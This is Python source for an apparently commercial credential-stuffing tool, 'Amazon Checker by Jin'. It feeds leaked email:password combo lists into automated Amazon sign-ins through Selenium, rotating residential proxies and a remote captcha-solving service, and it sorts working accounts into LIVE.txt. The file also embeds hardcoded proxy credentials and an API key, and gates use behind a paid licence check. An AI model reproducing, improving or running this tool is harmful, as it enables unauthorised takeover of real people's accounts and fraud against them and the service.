import base64
import ctypes
import os
import random
import urllib.request
import zipfile
from multiprocessing import Lock
from multiprocessing.dummy import Pool
from os import _exit
from random import choice
from time import sleep

import requests
from colorama import Fore, init
from selenium import webdriver
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.webdriver.common.keys import Keys
init()

bad = 0
good = 0
loaded = 0
errors = 0
checked = 0

lock = Lock()


class checker(object):
    def __init__(self, combo_location):
        self.combo_l = combo_location
        self.combo_list = []

    def solveCaptcha(self, url):
        file = urllib.request.urlopen(url).read(5000)
        img = base64.b64encode(file)
        send = requests.Session()
        header_data = {
            'file': img,
            'image_captcha_server': 'server_1',
            'key': '71496B39756D6437504F6D4650664B592B7A796A787841582B3535544E7A5A65775839744C792B5678684C573633676E3167692F5077317077774A5156644E42',
        }
        result = send.post(
            'https://rgunz.net/captcha/result.php', data=header_data)
        return result.text.strip()

    def bypassJS(self):
        bypassCaptcha = "document.getElementById('auth-captcha-guess').dispatchEvent(new Event('change'));"
        driver.execute_script(bypassCaptcha)

    def validAcc(self, mail, passw):
        global checked, good, loaded
        good += 1
        checked += 1
        lock.acquire()
        f = open("LIVE.txt", "a+")
        f.write("LIVE - Checked by Jin - Amazon Checker|{}|{}\n".format(mail, passw))
        f.close()
        lock.release()

    def invalidAcc(self, mail, passw):
        global checked, bad, loaded
        bad += 1
        checked += 1
        lock.acquire()
        f = open("DIE.txt", "a+")
        f.write("DIE - Checked by Jin - Amazon Checker|{}|{}\n".format(mail, passw))
        f.close()
        lock.release()

    def hide_file(self, filename):
        import win32file
        import win32con
        import win32api
        flags = win32file.GetFileAttributesW(filename)
        win32file.SetFileAttributes(filename,
                                    win32con.FILE_ATTRIBUTE_HIDDEN | flags)

    def show_file(self, filename):
        import win32file
        import win32con
        import win32api
        flags = win32file.GetFileAttributesW(filename)
        win32file.SetFileAttributes(filename,
                                    win32con.FILE_ATTRIBUTE_NORMAL | flags)

    def get_chromedriver(self, use_proxy=False):
        username = 'lum-customer-hl_323d7dae-zone-static-route_err-pass_dyn'
        password = 'sfch4fj8m3r9'
        port = 22225
        session_id = random.random()
        super_proxy_url = ('http://%s-country-us-session-%s:%s@zproxy.lum-superproxy.io:%d' %
                           (username, session_id, password, port))
        proxy_handler = urllib.request.ProxyHandler({
            'http': super_proxy_url,
            'https': super_proxy_url,
        })

        opener = urllib.request.build_opener(proxy_handler)
        opener.addheaders = \
            [('User-Agent', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36')]
        #print('Performing request')
        # print(opener.open('http://lumtest.com/myip.json').read())
        #print("This is super URL " + super_proxy_url + "\n")
        split = super_proxy_url.split(":")
        username_proxy = split[1].replace("//", "")
        password_proxy = split[2].rsplit("@")
        realpwd = password_proxy[0]
        ip_proxy = password_proxy[1]
        port_proxy = split[-1]

        manifest_json = """
        {
            "version": "1.0.0",
            "manifest_version": 2,
            "name": "Chrome Proxy",
            "permissions": [
                "proxy",
                "tabs",
                "unlimitedStorage",
                "storage",
                "<all_urls>",
                "webRequest",
                "webRequestBlocking"
            ],
            "background": {
                "scripts": ["background.js"]
            },
            "minimum_chrome_version":"22.0.0"
        }
        """

        background_js = """
        var config = {
                mode: "fixed_servers",
                rules: {
                singleProxy: {
                    scheme: "http",
                    host: "%s",
                    port: parseInt(%s)
                },
                bypassList: ["localhost"]
                }
            };

        chrome.proxy.settings.set({value: config, scope: "regular"}, function() {});

        function callbackFn(details) {
            return {
                authCredentials: {
                    username: "%s",
                    password: "%s"
                }
            };
        }

        chrome.webRequest.onAuthRequired.addListener(
                    callbackFn,
                    {urls: ["<all_urls>"]},
                    ['blocking']
        );
        """ % (ip_proxy, port_proxy, username_proxy, realpwd)
        path = os.path.dirname(os.path.abspath(__file__))
        chrome_options = webdriver.ChromeOptions()
        if use_proxy:
            pluginfile = 'auth.zip'

            with zipfile.ZipFile(pluginfile, 'w') as zp:
                zp.writestr("manifest.json", manifest_json)
                zp.writestr("background.js", background_js)
            chrome_options.add_extension(pluginfile)
            self.hide_file(pluginfile)
            chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
            # chrome_options.add_argument('headless')
        driver = webdriver.Chrome(
            os.path.join(path, 'chromedriver'),
            options=chrome_options)
        os.remove(pluginfile)  # remove for change IP per thread
        return driver

    def checker_main(self, email, password):
        global loaded, good, bad, checked, errors
        ctypes.windll.kernel32.SetConsoleTitleW(
            f"Amazon Checker by Jin - Checked: {checked} Bad: {bad} Good: {good} Error: {errors}")
        while True:
            try:
                #driver = webdriver.Chrome()
                #options = webdriver.ChromeOptions()
                #options.add_experimental_option('excludeSwitches', ['enable-logging'])
                # options.add_argument("headless")
                #driver = webdriver.Chrome(options=options)
                # driver.get("https://www.amazon.com/ap/signin?showRememberMe=true&openid.pape.max_auth_age=0&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&forceValidateCaptcha=true&use_audio_captcha=false&pageId=usflex&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fcss%2Fhomepage.html%2F146-0546965-4550715%3Fie%3DUTF8%26%252AVersion%252A%3D1%26%252Aentries%252A%3D0&prevRID=PFZZJD687NH684H7RF9Z&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&prepopulatedLoginId=eyJjaXBoZXIiOiJRWnhMd3o5enh6MWhtbGkrQVdpUVV3PT0iLCJJViI6IjVMbUs5RnA1MG5MRWlNRGFiT2t5emc9PSIsInZlcnNpb24iOjF9&failedSignInCount=2&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&ubid=135-1584179-7213821")
                driver = self.get_chromedriver(use_proxy=True)
                driver.get("https://www.amazon.com/ap/signin?showRememberMe=true&openid.pape.max_auth_age=0&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&forceValidateCaptcha=true&use_audio_captcha=false&pageId=usflex&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fcss%2Fhomepage.html%2F146-0546965-4550715%3Fie%3DUTF8%26%252AVersion%252A%3D1%26%252Aentries%252A%3D0&prevRID=PFZZJD687NH684H7RF9Z&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&prepopulatedLoginId=eyJjaXBoZXIiOiJRWnhMd3o5enh6MWhtbGkrQVdpUVV3PT0iLCJJViI6IjVMbUs5RnA1MG5MRWlNRGFiT2t5emc9PSIsInZlcnNpb24iOjF9&failedSignInCount=2&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&ubid=135-1584179-7213821")
                assert "Amazon" in driver.title
                # INPUT EMAIL
                sleep(3)
                driver.execute_script(
                    "document.getElementById(\"ap_email\").value='{}'".format(email))
                # SOLVE IMAGE CAPTCHA
                captcha = driver.find_element_by_id("auth-captcha-image")
                captcha_url = captcha.get_attribute("src")
                inputCaptcha = driver.find_element_by_id("auth-captcha-guess")
                imageCaptcha = self.solveCaptcha(captcha_url)
                solved = f"""var el = document.getElementById('auth-captcha-guess');
                el.value='{imageCaptcha}';
                el.dispatchEvent(new Event('change'));"""
                driver.execute_script(solved)
                sleep(3)
                driver.find_element_by_xpath("//*[@id=\"continue\"]").click()
                # CHECK FAILED
                sleep(3)
                if """We cannot find an account with that email address""" in driver.page_source:
                    self.invalidAcc(email, password)
                    driver.quit()
                else:
                    sleep(3)
                    input_pass = f"document.getElementById(\"ap_password\").value='{password}'"
                    driver.execute_script(input_pass)
                    sleep(3)
                    driver.find_element_by_xpath(
                        '//*[@id="signInSubmit"]').click()
                    sleep(3)
                    if """We will send you a One Time Password (OTP) to authenticate your request.""" in driver.page_source:
                        self.validAcc(email, password)
                        driver.quit()
                    elif """To better protect your account, please re-enter your password and then enter the characters as they are shown in the image below.""" in driver.page_source:
                        print(Fore.LIGHTGREEN_EX + "Processing....")
                        input_pass = f"document.getElementById(\"ap_password\").value='{password}'"
                        driver.execute_script(input_pass)
                        sleep(3)
                        captcha = driver.find_element_by_id(
                            "auth-captcha-image")
                        captcha_url = captcha.get_attribute("src")
                        inputCaptcha = driver.find_element_by_id(
                            "auth-captcha-guess")
                        imageCaptcha = self.solveCaptcha(captcha_url)
                        solved = f"""var el = document.getElementById('auth-captcha-guess');
                        el.value='{imageCaptcha}';
                        el.dispatchEvent(new Event('change'));"""
                        driver.execute_script(solved)
                        sleep(1)
                        driver.find_element_by_xpath(
                            '//*[@id="signInSubmit"]').click()
                        sleep(5)
                        if """Your password is incorrect""" in driver.page_source:
                            self.invalidAcc(email, password)
                            driver.quit()
                        elif """Authentication required""" in driver.page_source:
                            self.validAcc(email, password)
                            driver.quit()
                        elif """We will send you a One Time Password (OTP) to authenticate your request.""" in driver.page_source:
                            self.validAcc(email, password)
                            driver.quit()
                        elif """This is required if your sign-in looks different because you’ve cleared your cookies or you're signing from a different browser, device, or location.""" in driver.page_source:
                            self.validAcc(email, password)
                            driver.quit()
                        elif """Enter the characters as they are given in the challenge.""" in driver.page_source:
                            try:
                                ctypes.windll.kernel32.SetConsoleTitleW(
                                    f"Amazon Checker by Jin - Checked: {checked} Bad: {bad} Good: {good} Error: {errors}")
                                print(Fore.LIGHTRED_EX +
                                      "Processing wrong captcha....")
                                input_pass = f"document.getElementById(\"ap_password\").value='{password}'"
                                driver.execute_script(input_pass)
                                sleep(3)
                                driver.find_element_by_xpath(
                                    '//*[@id="signInSubmit"]').click()
                                sleep(3)
                                if """To better protect your account, please re-enter your password and then enter the characters as they are shown in the image below.""" in driver.page_source:
                                    print(Fore.LIGHTRED_EX +
                                          "Processing wrong captcha....")
                                    input_pass = f"document.getElementById(\"ap_password\").value='{password}'"
                                    driver.execute_script(input_pass)
                                    sleep(3)
                                    captcha = driver.find_element_by_id(
                                        "auth-captcha-image")
                                    captcha_url = captcha.get_attribute("src")
                                    inputCaptcha = driver.find_element_by_id(
                                        "auth-captcha-guess")
                                    imageCaptcha = self.solveCaptcha(
                                        captcha_url)
                                    solved = f"""var el = document.getElementById('auth-captcha-guess');
                                    el.value='{imageCaptcha}';
                                    el.dispatchEvent(new Event('change'));"""
                                    driver.execute_script(solved)
                                    sleep(1)
                                    driver.find_element_by_xpath(
                                        '//*[@id="signInSubmit"]').click()
                                    sleep(3)
                                    if """Your password is incorrect""" in driver.page_source:
                                        self.invalidAcc(email, password)
                                        driver.quit()
                                    elif """We will send you a One Time Password (OTP) to authenticate your request.""" in driver.page_source:
                                        self.validAcc(email, password)
                                        driver.quit()
                                    elif """Authentication required""" in driver.page_source:
                                        self.validAcc(email, password)
                                        driver.quit()
                                    else:
                                        self.validAcc(email, password)
                                        driver.quit()
                                    break
                            except:
                                continue
                        else:
                            continue  # raise Exception
                        break
                    else:
                        self.invalidAcc(email, password)
                        driver.quit()
                    break
                break
            except:
                errors += 1
                continue

    def combo_loader(self):
        _combo_ = open(self.combo_l, "r").readlines()
        _combo_fresh = [items.rstrip() for items in _combo_]
        for lines in _combo_fresh:
            new_lines = lines.split(":")
            self.combo_list.append({"email": new_lines[0],
                                    "password": new_lines[1]})

    def sender(self, list_accounts):
        email = list_accounts["email"]
        password = list_accounts["password"]
        while True:
            try:
                self.checker_main(email, password)
                break
            except Exception:
                print("^C")
                pass

    def threads(self):
        self.combo_loader()
        self.threads = 5
        pool = Pool(self.threads)
        try:
            for _ in pool.imap_unordered(self.sender, self.combo_list):
                pass
        except KeyboardInterrupt:
            _exit(0)

        print("Done!")
        print("Thank you for using Amazon Checker!")


if __name__ == "__main__":
    try:
        os.remove("auth.zip")
    except:
        pass
    ctypes.windll.kernel32.SetConsoleTitleW(
        "Amazon Checker by {}".format('Jin'))
    print(Fore.LIGHTCYAN_EX+"Amazon Private Checker by Jin")
    print("")
    print("Please enter Key below...")
    while True:
        keyCheck = requests.get('https://rgunz.net/captcha/amz.txt')
        keyCheck_final = keyCheck.text.splitlines()
        _key = input("Key : ")
        if _key in keyCheck_final:
            combo_name = input("Combo Name: ")
            print(Fore.LIGHTCYAN_EX + "I'm Processing...Please wait")
            checker(combo_name).threads()
            break
        else:
            print("Invalid Key. Please contact Jin to buy or try again !!!")
            continue
